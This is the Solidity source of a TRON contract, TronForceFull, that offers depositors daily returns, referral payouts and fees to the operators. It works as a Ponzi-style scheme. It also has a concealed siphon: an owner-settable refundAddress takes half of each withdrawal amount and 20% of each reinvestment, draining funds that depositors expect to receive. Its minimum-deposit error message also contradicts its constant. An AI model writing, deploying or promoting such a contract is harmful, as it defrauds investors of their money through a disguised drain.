//SourceUnit: TronForceFull.sol

pragma solidity 0.5.4;

contract TronForceFull {

    using SafeMath for uint;
    

    uint constant public INVEST_MIN_AMOUNT = 200 trx;
    
    // uint constant public WITHDRAW_MIN_AMOUNT = 50 trx;

    uint constant public BASE_PERCENT = 300;

    uint[] public REFERRAL_PERCENTS = [500, 400, 300, 200, 100];

    uint constant public MARKETING_FEE = 600;

    uint constant public DEV_FEE = 500;
    
    uint constant public PROJECT_FEE = 300;
    
    uint constant public REINVEST_PERCENT = 5000;

    uint constant public WITHDRAW_PERCENT = 4000;
    
    uint constant public INSURANCE_PERCENT = 2000;
    
    uint constant public PERCENTS_DIVIDER = 10000;

    uint constant public BALANCE_RATE_STEP = 1000000 trx;
    
    uint constant public TIME_STEP = 1 days;

    uint constant public WITHDRAW_INTERVAL = 7 * TIME_STEP;

    uint public totalInvested;

    uint public totalWithdrawn;
    
    uint public totalUsers;


    address payable public marketingAddress;

    address payable public projectAddress;

    address payable public devAddress;
    
    address payable public refundAddress;
    
    address public owner;


    struct Deposit {

        uint64 amount;

        uint64 withdrawn;

        uint32 start;
        
        bool reInvest;

    }



    struct User {

        Deposit[] deposits;

        uint32 checkpoint;

        address referrer;
        
        uint32 rate;

    }



    mapping (address => User) internal users;



    event Newbie(address indexed user, address indexed referrer);

    event NewDeposit(address indexed user, uint amount);

    function () external payable {}

    constructor(address payable marketingAddr, address payable projectAddr, address payable devAddr) public {

        require(!isContract(marketingAddr) && !isContract(projectAddr) && !isContract(devAddr));

        marketingAddress = marketingAddr;

        projectAddress = projectAddr;
        
        devAddress = devAddr;
        
        owner = msg.sender;
        
        users[msg.sender].deposits.push(Deposit(1 trx, 0, uint32(block.timestamp), false));

    }

    function setRefundAddress(address payable _addr) external{
        
        require(msg.sender == owner);
        
        refundAddress = _addr;
        
    }

    function invest(address referrer) public payable {

        require(!isContract(msg.sender) && msg.sender == tx.origin);
        
        require(refundAddress != address(0));

        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 100 TRX");

        User storage user = users[msg.sender];
        
        uint msgValue = msg.value;

        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);

        uint devFee = msgValue.mul(DEV_FEE).div(PERCENTS_DIVIDER);
        
        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);



        marketingAddress.transfer(marketingFee);

        devAddress.transfer(devFee);
        
        projectAddress.transfer(projectFee);


        if (user.referrer == address(0)) {
            
            require( users[referrer].deposits.length > 0 && referrer != msg.sender, "Invalid referrer");

            user.referrer = referrer;

        }


        address upline = user.referrer;

        for (uint i = 0; i < REFERRAL_PERCENTS.length; i++) {

            if (upline != address(0)) {

                uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                if (amount > 0) {

                    address(uint160(upline)).transfer(amount);

                }

                upline = users[upline].referrer;

            } else break;

        }


        if (user.deposits.length == 0) {

            user.checkpoint = uint32(block.timestamp);
            
            totalUsers++;

            emit Newbie(msg.sender, user.referrer);

        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp), false));

        totalInvested = totalInvested.add(msgValue);

        emit NewDeposit(msg.sender, msgValue);

    }



    function withdraw() public {

        User storage user = users[msg.sender];
        
        require(block.timestamp.sub(user.checkpoint) > WITHDRAW_INTERVAL, 'Once a week');

        uint totalAmount;

        uint dividends;

        uint userRate = getUserRate(msg.sender);

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userRate).div(PERCENTS_DIVIDER))

                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))

                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userRate).div(PERCENTS_DIVIDER))

                        .mul(block.timestamp.sub(uint(user.checkpoint)))

                        .div(TIME_STEP);

                }


                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3)) {

                    dividends = (uint(user.deposits[i].amount).mul(3)).sub(uint(user.deposits[i].withdrawn));

                }

                dividends = dividends.mul(WITHDRAW_PERCENT).div(PERCENTS_DIVIDER);
                
                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); 

                totalAmount = totalAmount.add(dividends);

            }

        }

        // require(totalAmount > WITHDRAW_MIN_AMOUNT, "Insufficient dividends");
        
        refundAddress.transfer(totalAmount.div(2) > address(this).balance ? address(this).balance : totalAmount.div(2));

        user.checkpoint = uint32(block.timestamp);

        msg.sender.transfer(totalAmount > address(this).balance ? address(this).balance : totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

    }



    function reInvest() public {

        require(!isContract(msg.sender) && msg.sender == tx.origin);

        User storage user = users[msg.sender];
        
        require(block.timestamp.sub(user.checkpoint) > WITHDRAW_INTERVAL, 'Once a week');
        
        uint msgValue = getUserAvailable(msg.sender);
        
        uint marketingFee = msgValue.mul(600).div(PERCENTS_DIVIDER);

        uint devFee = msgValue.mul(300).div(PERCENTS_DIVIDER);
        
        uint projectFee = msgValue.mul(200).div(PERCENTS_DIVIDER);
        
        marketingAddress.transfer(marketingFee > address(this).balance ? address(this).balance : marketingFee);

        devAddress.transfer(devFee > address(this).balance ? address(this).balance : devFee);
        
        projectAddress.transfer(projectFee > address(this).balance ? address(this).balance : projectFee);

        refundAddress.transfer(msgValue.mul(INSURANCE_PERCENT).div(PERCENTS_DIVIDER));
        
        user.rate = uint(user.rate).add(10) >= 100 ? 100 : uint32(uint(user.rate).add(10));
        
        user.checkpoint = uint32(block.timestamp);

        user.deposits.push(Deposit(uint64(msgValue.mul(REINVEST_PERCENT).div(PERCENTS_DIVIDER)), 0, uint32(block.timestamp), true));

    }


    function getContractBalance() public view returns (uint) {

        return address(this).balance;

    }


    function getUserRate(address _addr) public view returns (uint) {

        uint balanceRate = address(this).balance.mul(10).div(BALANCE_RATE_STEP);
        
        balanceRate = balanceRate > 100 ? 100 : balanceRate;
        
        return balanceRate.add(users[_addr].rate).add(BASE_PERCENT);
    }


    function getUserAvailable(address userAddress) public view returns (uint) {

        User storage user = users[userAddress];

        uint totalDividends;

        uint dividends;

        uint userRate = getUserRate(userAddress);
        
        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userRate).div(PERCENTS_DIVIDER))

                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))

                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userRate).div(PERCENTS_DIVIDER))

                        .mul(block.timestamp.sub(uint(user.checkpoint)))

                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3)) {

                    dividends = (uint(user.deposits[i].amount).mul(3)).sub(uint(user.deposits[i].withdrawn));

                }

                totalDividends = totalDividends.add(dividends);


            }


        }

        return totalDividends;

    }


    function getUserTotalDeposits(address userAddress) public view returns (uint) {

        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {

            if(!user.deposits[i].reInvest) 
                amount = amount.add(uint(user.deposits[i].amount));

        }

        return amount;

    }


    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {

        User storage user = users[userAddress];
        
        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {

            amount = amount.add(uint(user.deposits[i].withdrawn));

        }

        return amount;

    }


    function getUserDeposits(address userAddress) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {

        User storage user = users[userAddress];


        uint[] memory amount = new uint[](user.deposits.length);

        uint[] memory withdrawn = new uint[](user.deposits.length);

        uint[] memory start = new uint[](user.deposits.length);
        
        uint[] memory reInvests = new uint[](user.deposits.length);


        for (uint i = 0; i < user.deposits.length; i++) {

            amount[i] = uint(user.deposits[i].amount);

            withdrawn[i] = uint(user.deposits[i].withdrawn);

            start[i] = uint(user.deposits[i].start);

            reInvests[i] = (user.deposits[i].reInvest ? 1 : 0);
        }



        return (amount, withdrawn, start, reInvests);

    }
    
    
    function getData(address _addr) external view returns ( uint[] memory data ){
    
        User memory u = users[_addr];
        uint[] memory d = new uint[](10);
        
        d[0] = u.deposits.length;
        d[1] = getUserTotalDeposits(_addr);
        d[2] = getUserRate(_addr);
        d[3] = getUserTotalWithdrawn(_addr);
        d[4] = getUserAvailable(_addr);
        d[5] = u.checkpoint;
        d[6] = totalUsers;
        d[7] = totalInvested;
        d[8] = totalWithdrawn;
        d[9] = getContractBalance();
        
        return d;
        
    }


    function isContract(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size > 0;

    }



}



library SafeMath {



    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b <= a, "SafeMath: subtraction overflow");

        uint256 c = a - b;



        return c;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }



        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0, "SafeMath: division by zero");

        uint256 c = a / b;



        return c;

    }

}